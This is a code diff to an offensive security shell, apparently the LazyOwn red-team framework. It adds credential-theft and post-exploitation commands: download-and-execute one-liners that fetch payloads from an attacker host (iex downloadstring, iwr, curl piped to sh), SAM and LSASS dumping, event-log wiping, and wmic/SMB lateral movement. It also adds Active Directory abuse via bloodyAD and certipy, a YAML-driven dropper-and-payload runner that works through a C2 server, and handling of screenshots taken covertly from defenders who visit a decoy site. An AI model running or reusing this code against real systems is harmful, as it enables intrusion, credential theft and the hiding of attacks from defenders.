@@ -183,9 +183,11 @@ class LazyOwnShell(cmd2.Cmd):
         "sniff": "run lazysniff",
         "sshr": "sh ssh root@segfault.net",
         "status": "sh git status",
+        "stop_ntp": "sh sudo timedatectl set-ntp false",
         "stop_squid": "sh sudo systemctl stop squid",
         "start_squid": "sh sudo systemctl start squid",
         "start_ollama": "sh sudo systemctl start ollama",
+        "start_ntp": "sh sudo timedatectl set-ntp true",
         "stop_ollama": "sh sudo systemctl stop ollama",
         "stop_apt": "sh sudo systemctl stop apt-cacher-ng",
         "start_apt": "sh sudo systemctl start apt-cacher-ng",
@@ -233,7 +235,17 @@ class LazyOwnShell(cmd2.Cmd):
         self.load_plugins()
         self.register_tool_commands()
         self.completekey = 'tab' 
-        
+        self.register_all_adversary_commands()
+        self.output = ""
+        self.custom_prompt = getprompt()
+        self.c2_url = f"https://{lhost}:{c2_port}"
+        self.c2_auth = (c2_user, c2_pass)
+        self.c2_clientid = "no_priv"
+        self.path = os.getcwd()
+        self.url_download = url_download
+        self.version = version
+        self.sessions_dir = f"{self.path}/sessions"
+        self.captured_images_dir = os.path.join(self.sessions_dir, 'captured_images')        
         self.params = {
             "binary_name": "gzip",
             "api_key": None,
@@ -328,15 +340,7 @@ class LazyOwnShell(cmd2.Cmd):
             "lazyssh77enum",
             "lazywerkzeugdebug",
         ]
-        self.output = ""
-        self.custom_prompt = getprompt()
-        self.c2_url = f"https://{lhost}:{c2_port}"
-        self.c2_auth = (c2_user, c2_pass)
-        self.c2_clientid = "no_priv"
-        self.path = os.getcwd()
-        self.url_download = url_download
-        self.version = version
-        self.sessions_dir = f"{self.path}/sessions"
+
         
     def log_command(self, cmd_name, cmd_args):
         """
@@ -493,7 +497,7 @@ class LazyOwnShell(cmd2.Cmd):
     def list_files_in_directory(self, directory):
         """Lista todos los archivos en un directorio dado."""
         if not os.path.exists(directory):
-            return []  # Devuelve una lista vacía si el directorio no existe
+            return []
         return [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]
 
     def register_tool_commands(self):
@@ -560,7 +564,6 @@ class LazyOwnShell(cmd2.Cmd):
                             docstring += f"protocol:\n  {service.protocol}\n\n"
                             docstring += f"port:\n  {service.port}\n\n"
                             docstring += f"ip:\n  {host.address}\n\n"
-                            print(f"Valor de cmd_params['outputdir']: {cmd_params['outputdir']}")
                             docstring += f"logs:\n  {cmd_params["outputdir"]}\n"
                             tool_wrapper.__doc__ = docstring
 
@@ -711,7 +714,37 @@ class LazyOwnShell(cmd2.Cmd):
         wrapper_yaml.__doc__  = description
         setattr(self, f'do_{name}', wrapper_yaml)
         print_msg(f"Command '{name}' registered from YAML.")
-    
+
+    def register_all_adversary_commands(self):
+        for file in glob.glob("lazyadversaries/*.yaml"):
+            with open(file, 'r') as f:
+                try:
+                    data = yaml.safe_load(f)
+                    if isinstance(data, dict):
+                        self._register_adversary_command(data)
+                    elif isinstance(data, list):
+                        for adversary in data:
+                            self._register_adversary_command(adversary)
+                except Exception as e:
+                    print_error(f"Error parsing {file}: {e}")
+
+    def _register_adversary_command(self, adv):
+        if not all(k in adv for k in REQUIRED_KEYS):
+            print_warn(f"Skipping invalid adversary entry (missing required fields): {adv.get('name', '<unnamed>')}")
+            return
+
+        name = adv['name'].replace('.', '_')
+        description = adv['description']
+
+        @cmd2.with_category("15. Adversary YAML.")
+        def cmd_wrapper(_):
+            return self.do_adversary_yaml(str(adv['id']) + ' l')
+
+        cmd_wrapper.__doc__ = description
+        setattr(self, f'do_{name}', cmd_wrapper)
+        print_msg(f"Command '{name}' registered for adversary ID {adv['id']}")
+
+
     def do_EOF(self, line):
         """
         Handle the end-of-file (EOF) condition.
@@ -3973,18 +4006,8 @@ class LazyOwnShell(cmd2.Cmd):
 
         This command appends the IP address and domain name to the `/etc/hosts` file, enabling local resolution of the domain.
         """
+        self.onecmd("PTMultiTools")
 
-        rhost = self.params["rhost"]
-        if not rhost or not line:
-            print_error(
-                f"Add domain and rhost must be assign to more info see help assign (assign rhost 10.10.10.10) ex: addhost domain.ext {RESET}"
-            )
-            return
-        print_msg(
-            f"Try... sudo -- sh -c -e \"echo '{rhost} {line}' >> /etc/hosts\"; {RESET}"
-        )
-        os.system(f"sudo -- sh -c -e \"echo '{rhost} {line}' >> /etc/hosts\";")
-        print_msg(f"Done... add {line} to /etc/hosts {RESET}")
         return
     
     @cmd2.with_category(scanning_category)
@@ -5428,6 +5451,9 @@ class LazyOwnShell(cmd2.Cmd):
         if not device:
             print_error("Device must be assign use assign device <network_device_ex_tun0>")
             return
+        if not is_binary_present("responder"):
+            print_warn("Responder not found installing...")
+            self.cmd("sudo apt install responder python-aioquic -y")
         print_msg(f"Try sudo responder -I {device} -w On ")
         self.cmd(f"sudo responder -I {device} -w On ")
         return
@@ -6178,6 +6204,20 @@ class LazyOwnShell(cmd2.Cmd):
             ("WIN Show running services", "net start"),
             ("WIN User accounts", "net user"),
             ("WIN Show computers", "net view"),
+            ("WIN WinPwn", f"iex(new-object net.webclient).downloadstring('https://{lhost}/WinPwn.ps1')"),
+            ("WIN Show computers", f"net use \\\\{rhost} \"{start_pass}\" /u:{domain}\\{start_user}"),
+            ("WIN Save SAM 2", "C:\\Windows\\System32\\reg.exe save hklm\\sam sam.hive"),
+            ("WIN Delete Logs", "wevtutil cl system ; wevtutil cl security ; wevtutil cl application"),
+            ("WIN Save SAM", f"wmic /node:{rhost} /user:{start_user} /password:{start_pass} process call create \"cmd.exe /c reg save HKLM\\sam C:\\Windows\\Temp\\sam.save\""),
+            ("WIN Save SECURITY", f"wmic /node:{rhost} /user:{start_user} /password:{start_pass} process call create \"cmd.exe /c reg save HKLM\\security C:\\Windows\\Temp\\security.save\""),
+            ("WIN Save SYSTEM", f"wmic /node:{rhost} /user:{start_user} /password:{start_pass} process call create \"cmd.exe /c reg save HKLM\system C:\\Windows\\Temp\\system.save\""),
+            ("WIN Show System Network", f"route print ; tracert -h 2 {rhost} ; ipconfig /displaydns"),
+            ("WIN Show creds", "procdump.exe -accepteula -ma lsass.exe С:\Windows\Temp\mem.dmp"),
+            ("WIN enum sysinfo", "hostname ; systeminfo ; cmd /c echo list volume |diskpart"),
+            ("WIN ping to user", f"cmd.exe /c C: & cd\ & cd \"\" & ping {lhost} -n 1"),
+            ("WIN connected network drives:", f"cmd.exe /c C: & cd\ & cd \"\" & net use"),
+            ("WIN connect remote hosts via SMB", f"cmd.exe /c C: & cd\ & cd \"\" & net use \\\\{rhost} /u:{domain}\{start_user} {start_pass}"),
+            ("WIN wmic lateral mov",f"cmd.exe /c C: & cd\ & cd \"\" & wmic /node:{rhost} /user:{domain}\{start_user} /password:{start_pass} process call create \"whoami\""),
             ("WIN user.txt FLAG", "Get-ChildItem -Path C:\ -Include user.txt -File -Recurse -ErrorAction SilentlyContinue -Force"),
             ("WIN tscon active session id 2", "tscon 2 /dest:console"),
             ("WIN shado hijack session id 2 rdp", "mstsc /shadow:2 /noconsentprompt /control /v:dc1_host"),
@@ -10584,12 +10624,12 @@ class LazyOwnShell(cmd2.Cmd):
             choice = input("    [!] choice target windows 1, linux 2, windows bat 3, mac 4, android 5, IOS 6, WebAssembly 7 (default 1) : ") or '1'
 
         if choice == '1':
-            payload = f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/w -OutFile z.ps1 ; .\\z.ps1`\"\""
+            payload = f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/{line}.exe -OutFile {line}.exe ; .\\{line}.exe`\"\""
             copy2clip(payload)
             platform = "windows"
             user_agent = user_agent_win
         elif choice == '2':
-            payload = f"curl http://{lhost}/payload.sh -o /tmp/p && sh /tmp/p"
+            payload = f"curl http://{lhost}/{line} -o /tmp/{line} && sh /tmp/{line}"
             copy2clip(payload)
             platform = "linux"
             user_agent = user_agent_lin
@@ -12110,40 +12150,53 @@ class LazyOwnShell(cmd2.Cmd):
 
         url = self.params["url"]
         rhost = self.params["rhost"]
+        subdomain = self.params["subdomain"]
+        domain = self.params["domain"]
         path = os.getcwd()
-        users_txt = get_users_dic()
-        domain = get_domain(url)
-        ca = domain.split(".")
-        base_domain = ca[0].upper()
-        ext = ca[1].upper()
-        if not check_rhost(rhost):
-            return
-        
-        cn = input("    [!] Enter CN= example CHIEFS MARKETING: ")
+        if line.startswith("pass"):
+            credentials = get_credentials()
+            if not credentials:
+                return
+            for user, passwd in credentials:
+                cn = input("    [!] Enter CN= example SERVICE ACCOUNTS: ") or 'SERVICE ACCOUNTS'
+                cmd = f"bloodyAD --host '{rhost}' -d '{subdomain}.{domain}' -u '{user}' -p '{passwd}'  add groupMember '{cn}' {user}"
+                self.cmd(cmd)
+                return
+        elif line.startswith("cache"):
+            users_txt = get_users_dic()
+            domain = get_domain(url)
+            ca = domain.split(".")
+            base_domain = ca[0].upper()
+            ext = ca[1].upper()
+            if not check_rhost(rhost):
+                return
+            
+            cn = input("    [!] Enter CN= example CHIEFS MARKETING: ")
 
-        if not os.path.exists(users_txt):
-            print_error(f"you need {users_txt} exec: sh nano sessions/users.txt, to create first attemp use cewl")
-            return
- 
-        with open(users_txt, "r") as file:
-            users = [user.strip() for user in file]
+            if not os.path.exists(users_txt):
+                print_error(f"you need {users_txt} exec: sh nano sessions/users.txt, to create first attemp use cewl")
+                return
+    
+            with open(users_txt, "r") as file:
+                users = [user.strip() for user in file]
 
-        print_msg("Select a user by number to execute the command for a specific user, or press Enter to execute for all users:")
-        for idx, user in enumerate(users, start=1):
-            print_warn(f"{idx}. {user}")
+            print_msg("Select a user by number to execute the command for a specific user, or press Enter to execute for all users:")
+            for idx, user in enumerate(users, start=1):
+                print_warn(f"{idx}. {user}")
 
-        selection = input("Enter the number of the user you want to select: ").strip()
-        sub = input("enter the subdomain example dc01: ")
-        if selection.isdigit():
-            selected_user = users[int(selection) - 1]
-            command = f"export KRB5CCNAME=/tmp/{selected_user}.ccache ; {bloodyad_path}/bloodyAD.py --host {sub}.{domain} -d {domain} --dc-ip {rhost} -u {selected_user} -k  add groupMember \"CN={cn},CN=USERS,DC={base_domain},DC={ext}\" {selected_user}"
-            print_msg(command)
-            self.cmd(command)
-        else:
-            for user in users:
-                command = f"export KRB5CCNAME=/tmp/{user}.ccache ; {bloodyad_path}/bloodyAD.py --host {sub}.{domain} -d {domain} --dc-ip {rhost} -u {user} -k add groupMember \"CN={cn},CN=USERS,DC={base_domain},DC={ext}\" {user}"
+            selection = input("Enter the number of the user you want to select: ").strip()
+            sub = input("enter the subdomain example dc01: ")
+            if selection.isdigit():
+                selected_user = users[int(selection) - 1]
+                command = f"export KRB5CCNAME=/tmp/{selected_user}.ccache ; {bloodyad_path}/bloodyAD.py --host {sub}.{domain} -d {domain} --dc-ip {rhost} -u {selected_user} -k  add groupMember \"CN={cn},CN=USERS,DC={base_domain},DC={ext}\" {selected_user}"
                 print_msg(command)
-                self.cmd(command) 
+                self.cmd(command)
+            else:
+                for user in users:
+                    command = f"export KRB5CCNAME=/tmp/{user}.ccache ; {bloodyad_path}/bloodyAD.py --host {sub}.{domain} -d {domain} --dc-ip {rhost} -u {user} -k add groupMember \"CN={cn},CN=USERS,DC={base_domain},DC={ext}\" {user}"
+                    print_msg(command)
+                    self.cmd(command) 
+        return
 
     @cmd2.with_category(exfiltration_category)
     def do_evilwinrm(self, line):
@@ -13780,6 +13833,8 @@ class LazyOwnShell(cmd2.Cmd):
                 print_msg(command)
                 self.cmd(command)
                 return
+        else:
+            print_error("use options line like: secretsdump sam | creds | system")
         return
 
     @cmd2.with_category(exfiltration_category)
@@ -14903,6 +14958,7 @@ class LazyOwnShell(cmd2.Cmd):
         rhost = self.params["rhost"]
         lhost = self.params["lhost"]
         lport = self.params["lport"]
+        
 
         if not rhost or not lhost:
             print_warn("RHOST and LHOST must be specified.")
@@ -14915,6 +14971,8 @@ class LazyOwnShell(cmd2.Cmd):
             set RHOSTS {rhost}
             set LHOST {lhost}
             set LPORT {lport}
+            set SMBPass {start_pass}
+            set SMBUser {start_user}
             run
             """)
 
@@ -19026,6 +19084,34 @@ class LazyOwnShell(cmd2.Cmd):
         else:
             print_error("Incorrect usage. Use 'pass' to authenticate with credentials or 'hash' to use a hash.")
             return
+
+    @cmd2.with_category(scanning_category)
+    def do_certipy_ad(self, line):
+        target = self.params["rhost"]
+        domain = self.params["domain"]
+        credentials = get_credentials()
+        if not credentials:
+            return
+        if line.startswith("shadow"):
+            for user, passwd in credentials:
+            
+                username = user
+                password = passwd
+                account = input("    [!] Enter Account for shadow abuse (default WINRM_SVC): ") or 'WINRM_SVC'
+                command = f"certipy-ad shadow auto -u '{username}@{domain}' -p '{password}' -account '{account}' -dc-ip {target}"
+                self.cmd(command)
+        elif line.startswith("vuln"):
+            for user, passwd in credentials:
+                hash_content = get_hash()
+                username = user
+                password = passwd
+                account = input("    [!] Enter Account for vulnerable abuse (default CA_SVC): ") or 'CA_SVC'
+                command = f"certipy-ad find -vulnerable -u CA_SVC -hashes \":{hash_content}\" -dc-ip {target}"
+                self.cmd(command)
+        else:
+            print_error("Enter valid option shadow or vuln")
+            return
+            
     @cmd2.with_category(scanning_category)
     def do_certipy(self, line):
         """
@@ -26188,7 +26274,56 @@ class LazyOwnShell(cmd2.Cmd):
             import traceback
             print_error(f"[!] Error during extraction: {str(e)}")
             print_error(traceback.format_exc())
+            
+    @cmd2.with_category(reporting_category) 
+    def do_img2vid(self, line):
+        """
+        Generates an MP4 video from PNG images found in the sessions/captured_images directory.
+        This images are generated by the ofensive js code in the decoy site (When the blueteam try to visit our c2 and success login).
 
+        The images are expected to have filenames in the format: capture_YYYYMMDD_HHMMSS.png.
+        The video will be created in the current working directory as 'output.mp4'.
+        Requires ffmpeg to be installed and accessible in the system's PATH.
+        """
+        if not os.path.isdir(self.captured_images_dir):
+            print_error(f"Error: Directory not found: {self.captured_images_dir}")
+            return
+
+        image_files = sorted(glob.glob(os.path.join(self.captured_images_dir, 'capture_*.png')))
+
+        if not image_files:
+            print_error("No PNG images found in the captured images directory.")
+            return
+
+        num_images = len(image_files)
+        frame_rate = 1
+        duration = num_images / frame_rate
+        fade_out_start = max(0, duration - 1)
+
+        try:
+            ffmpeg_cmd = [
+                'ffmpeg',
+                '-framerate', str(frame_rate),
+                '-pattern_type', 'glob',
+                '-i', os.path.join(self.captured_images_dir, 'capture_*.png'),
+                '-vf', f'fade=in:st=0:d=1,fade=out:st={fade_out_start}:d=1',
+                '-r', '30', # Output frame rate
+                '-c:v', 'libx264',
+                '-pix_fmt', 'yuv420p',
+                '-y',  # Overwrite output file if it exists
+                self.captured_images_dir + '/output.mp4'
+            ]
+            subprocess.run(ffmpeg_cmd, check=True, capture_output=True)
+            print_msg("Video "+ self.captured_images_dir + '/output.mp4' + " created successfully.")
+        except FileNotFoundError:
+            print_error("Error: ffmpeg command not found. Please ensure it is installed and in your system's PATH.")
+        except subprocess.CalledProcessError as e:
+            print_error(f"Error creating video: {e}")
+            print_error(f"FFmpeg output (stderr):\n{e.stderr.decode()}")
+        except Exception as e:
+            print_error(f"An unexpected error occurred: {e}")
+
+    @cmd2.with_category(post_exploitation_category) 
     def do_convert_remcomsvc_from_file(self, arg):
         """Converts the Python REMCOMSVC byte string from remcomsvc.py to Golang byte slice format, prints a sample, and saves it to sessions/remcomsvc.go. see lazyaddon GoPEInjection
         Usage: convert_remcomsvc_from_file
@@ -26219,6 +26354,267 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg(f"File saved in: {filepath}")
         except Exception as e:
             print_error(f"Error saving the file: {e}")
+
+    @cmd2.with_category(reporting_category)
+    def do_process_scans(self, line):
+        """
+        Processes CSV files with scan results and vulnerability data to generate a Shodan-like JSON database.
+
+        Args:
+            arg (Namespace): Arguments parsed by cmd2. Includes:
+                directory (str, positional): The directory containing the CSV files.
+
+        Returns:
+            None
+
+        Output:
+            A JSON file named 'surface_attack.json' in the specified directory containing the processed data.
+        """
+
+        all_data = {
+            "hosts": [],
+            "services": [],
+            "vulnerabilities": [],
+            
+        }
+        processed_ips = set()
+
+        
+        scan_files = glob.glob(os.path.join(self.sessions_dir, "scan_*.csv"))
+        for scan_file in scan_files:
+            match = re.match(r"scan_([^_]+)_(\d+).csv", os.path.basename(scan_file))
+            if match:
+                ip = match.group(1)
+                port = int(match.group(2))
+                self.process_scan_csv(scan_file, ip, port, all_data, processed_ips)
+            elif match := re.match(r"scan_([^_]+)\.csv", os.path.basename(scan_file)):
+                ip = match.group(1)
+                self.process_scan_csv(scan_file, ip, None, all_data, processed_ips)
+            elif match := re.match(r"scan_discovery_([^_]+)_(\d+)\.csv", os.path.basename(scan_file)):
+                ip = match.group(1)
+                port = int(match.group(2))
+                self.process_scan_csv(scan_file, ip, port, all_data, processed_ips)
+            elif match := re.match(r"scan_discovery_([^_]+)\.csv", os.path.basename(scan_file)):
+                ip = match.group(1)
+                self.process_scan_csv(scan_file, ip, None, all_data, processed_ips)
+
+        
+        vuln_files = glob.glob(os.path.join(self.sessions_dir, "vulns_*.csv"))
+        for vuln_file in vuln_files:
+            match = re.match(r"vulns_([^_]+).csv", os.path.basename(vuln_file))
+            if match:
+                ip = match.group(1)
+                self.process_vuln_csv(vuln_file, ip, all_data, processed_ips)
+
+        output_file = os.path.join(self.sessions_dir, "surface_attack.json")
+        with open(output_file, 'w') as f:
+            json.dump(all_data, f, indent=2)
+        print_msg(f"Processed CSV files and saved data to '{output_file}'.")
+
+    def process_scan_csv(self, csv_file, ip, port, all_data, processed_ips):
+        """Processes a single scan CSV file."""
+        with open(csv_file, 'r', newline='') as infile:
+            reader = csv.DictReader(infile, delimiter=';')
+            for row in reader:
+                host_entry = next((h for h in all_data['hosts'] if h['ip'] == ip), None)
+                if host_entry is None:
+                    host_entry = {"ip": ip, "hostnames": [row.get("FQDN", "")], "ports": []}
+                    all_data['hosts'].append(host_entry)
+                    processed_ips.add(ip)
+                if port is not None and port not in host_entry['ports']:
+                    host_entry['ports'].append(port)
+
+                service_entry = {
+                    "ip": ip,
+                    "port": int(row['PORT']) if row['PORT'] else port,
+                    "protocol": row['PROTOCOL'],
+                    "service": row['SERVICE'],
+                    "version": row['VERSION']
+                }
+                if service_entry not in all_data['services']:
+                    all_data['services'].append(service_entry)
+
+    def process_vuln_csv(self, csv_file, ip, all_data, processed_ips):
+        """Processes a single vulnerability CSV file."""
+        with open(csv_file, 'r', newline='') as infile:
+            reader = csv.DictReader(infile, delimiter=';')
+            for row in reader:
+                service_entry = {
+                    "ip": ip,
+                    "port": int(row['PORT']) if row['PORT'] else None,
+                    "protocol": row['PROTOCOL'],
+                    "service": row['SERVICE'],
+                    "version": row['VERSION']
+                }
+                
+                found_service = next((s for s in all_data['services'] if
+                                    s['ip'] == service_entry['ip'] and
+                                    s['port'] == service_entry['port'] and
+                                    s['protocol'] == service_entry['protocol'] and
+                                    s['service'] == service_entry['service'] and
+                                    s['version'] == service_entry['version']), None)
+                if not found_service:
+                    all_data['services'].append(service_entry)
+
+                vulnerability_entry = {
+                    "ip": ip,
+                    "port": int(row['PORT']) if row['PORT'] else None,
+                    "protocol": row['PROTOCOL'],
+                    "service": row['SERVICE'],
+                    "version": row['VERSION']
+                }
+                
+                
+                found_service_for_vuln = next((s for s in all_data['services'] if
+                                               s['ip'] == vulnerability_entry['ip'] and
+                                               s['port'] == vulnerability_entry['port'] and
+                                               s['protocol'] == vulnerability_entry['protocol'] and
+                                               s['service'] == vulnerability_entry['service'] and
+                                               s['version'] == vulnerability_entry['version']), None)
+                if found_service_for_vuln:
+                    if "vulnerabilities" not in found_service_for_vuln:
+                        found_service_for_vuln["vulnerabilities"] = []
+                    
+                    vuln_id = f"{ip}:{row['PORT']}:{row['SERVICE']}"
+                    if vuln_id not in [v['id'] for v in found_service_for_vuln["vulnerabilities"] if 'id' in v]:
+                        found_service_for_vuln["vulnerabilities"].append({"id": vuln_id, "description": "Known vulnerability (inferred from filename)"})
+
+    @cmd2.with_category(post_exploitation_category)
+    def do_adversary_yaml(self, line):
+        """
+        Execute adversary from YAML in lazyadversaries/*.yaml
+        Syntax: adversary [id] [l|r|n]
+        """
+        path = self.path
+        adversaries = self._load_adversaries()
+
+        with open(f"{path}/sessions/key.aes", 'rb') as f:
+            AES_KEY_hex = f.read().hex()
+
+        id_adversary, confirm = self._parse_adversary_args(line)
+        adversary = next((adv for adv in adversaries if adv['id'] == int(id_adversary)), None)
+
+        if not adversary:
+            print_error(f"No adversary found with id {id_adversary}")
+            return
+
+        replacements = {
+            "output_path": adversary["output_path"],
+            "binary": adversary["binary"],
+            "path_src": adversary["path_src"],
+            "name": adversary["name"],
+            "target_path": adversary["target_path"],
+            "pid": adversary.get("pid", ""),
+            "param": adversary.get("param", ""),
+            "shellcode": adversary.get("shellcode", ""),
+            "lhost": self.params["lhost"],
+        }
+
+        command = replace_placeholders(adversary["command"], replacements)
+        if adversary.get("encoder") == "base64":
+            replacements["base64_command"] = base64.b64encode(command.encode()).decode()
+
+        replacements.update({
+            "lport": self.params["lport"],
+            "username": self.params["c2_user"],
+            "password": self.params["c2_pass"],
+            "platform": adversary["target_os"],
+            "sleep": str(adversary["sleep"]),
+            "maleable": self.params["c2_maleable_route"],
+            "useragent": self.params["user_agent_lin"] if adversary["target_os"] == "linux" else self.params["user_agent_win"],
+            "key": AES_KEY_hex
+        })
+
+        self._patch_template_if_needed(adversary, path, replacements)
+
+        commands = self._build_command_stack(adversary, replacements)
+        self._display_adversary_info(adversary, commands)
+
+        if not confirm:
+            confirm = input("Execute stack? (l)ocal, (r)emote, (n)o: ").strip().lower() or 'n'
+
+        self._execute_commands(confirm, commands['remote'])
+
+        output_filename = f"output_{adversary['name']}.txt"
+        remote_output_path = os.path.join(adversary['target_path'], output_filename)
+        local_output_path = os.path.join(path, "sessions", "uploads", output_filename)
+
+        if confirm == 'l':
+            subprocess.run(f"cp {remote_output_path} {local_output_path}", shell=True)
+            for file in glob.glob(f"{path}/sessions/uploads/*"):
+                self.upload_file_to_c2(file, self.c2_clientid)
+        elif confirm == 'r':
+            self.issue_command_to_c2(f"upload:{output_filename}", self.c2_clientid)
+            self.download_file_from_c2(output_filename, self.c2_clientid)
+
+    def _load_adversaries(self):
+        adversaries = []
+        for file in glob.glob("lazyadversaries/*.yaml"):
+            with open(file, 'r') as f:
+                try:
+                    data = yaml.safe_load(f)
+                    if isinstance(data, list):
+                        adversaries.extend(data)
+                    elif isinstance(data, dict):
+                        adversaries.append(data)
+                except Exception as e:
+                    print_error(f"Error loading {file}: {e}")
+        return adversaries
+
+    def _parse_adversary_args(self, line):
+        args = line.split()
+        if len(args) == 2:
+            return args[0], args[1]
+        elif len(args) == 1:
+            return args[0], None
+        else:
+            return input("Enter ID: "), None
+
+    def _patch_template_if_needed(self, adversary, path, replacements):
+        template_path = os.path.join(path, adversary['output_path'], adversary['name'])
+        if os.path.exists(template_path):
+            with open(template_path, 'r') as f:
+                content = f.read()
+                for key, val in replacements.items():
+                    content = content.replace(f"{{{key}}}", val)
+            with open(template_path, 'w') as f:
+                f.write(content)
+
+    def _build_command_stack(self, adversary, r):
+        return {
+            'local': [
+                replace_placeholders(adversary['copy_command'], r),
+                replace_placeholders(adversary['replace_command'].replace("[shellcode]", "{shellcode}"), r),
+                replace_placeholders(adversary['compile'], r),
+            ],
+            'remote': [
+                replace_placeholders(adversary['droper'], r),
+                replace_placeholders(adversary['payload'], r),
+                replace_placeholders(adversary['clean_cmd'], r),
+            ],
+        }
+
+    def _display_adversary_info(self, adversary, commands):
+        print_msg(f"Id: {adversary['id']}")
+        print_msg(f"Name: {adversary['name']}")
+        print_msg(f"Technique: {adversary['technique_name']}")
+        print_msg(f"Target OS: {adversary['target_os']}")
+        print_msg(f"Encoded Cmd: {commands['remote'][1]}")
+
+    def _execute_commands(self, confirm, remote_cmds):
+        if confirm == 'l':
+            for cmd in remote_cmds:
+                subprocess.run(cmd + " 2>/dev/null", shell=True)
+                time.sleep(1)
+        elif confirm == 'r':
+            for cmd in remote_cmds:
+                self.issue_command_to_c2(cmd, self.c2_clientid)
+                time.sleep(1)
+        else:
+            for cmd in remote_cmds:
+                subprocess.Popen(['xclip', '-selection', 'clipboard'], stdin=subprocess.PIPE).communicate(input=cmd.encode())
+                print_msg(f"Command copied: {cmd}")
+            print_warn("Execution cancelled.")
 
 if __name__ == "__main__":
     p = LazyOwnShell()
